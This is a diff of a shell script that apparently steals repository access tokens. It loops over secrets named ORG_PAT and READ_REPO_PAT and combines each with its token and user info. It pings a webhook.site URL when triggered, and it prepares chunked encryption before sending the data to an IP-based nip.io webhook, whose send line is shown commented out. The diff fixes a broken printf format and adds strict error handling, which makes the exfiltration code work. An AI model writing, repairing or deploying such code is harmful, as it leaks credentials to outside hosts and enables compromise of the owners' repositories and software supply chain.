@@ -1,5 +1,6 @@
 webhook="https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff"
 export LC_ALL=C
+set -euo pipefail
 
 # Test if triggered
 curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/start
@@ -32,7 +33,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		string="$user_info"     # includes response headers because of -i
 
 		# ------------------------------------------------ combine string -----
-		printf -v block 'secret:\n%s\ntoken:\n%s\nuser info:\n "$pat "$token" "$user_info"
+		printf -v block 'secret:\n%s\ntoken:\n%s\nuser info:\n%s' "$pat "$token" "$user_info"
 		string+="${block}"$'\n\n'
 		
 
@@ -43,7 +44,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 #		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$encrypted_string"
 done
 
-
+string="${string%$'\n\n'}"
 
 # ------------------------------------------------ chunked encryption -----
 CHUNK_SIZE=190
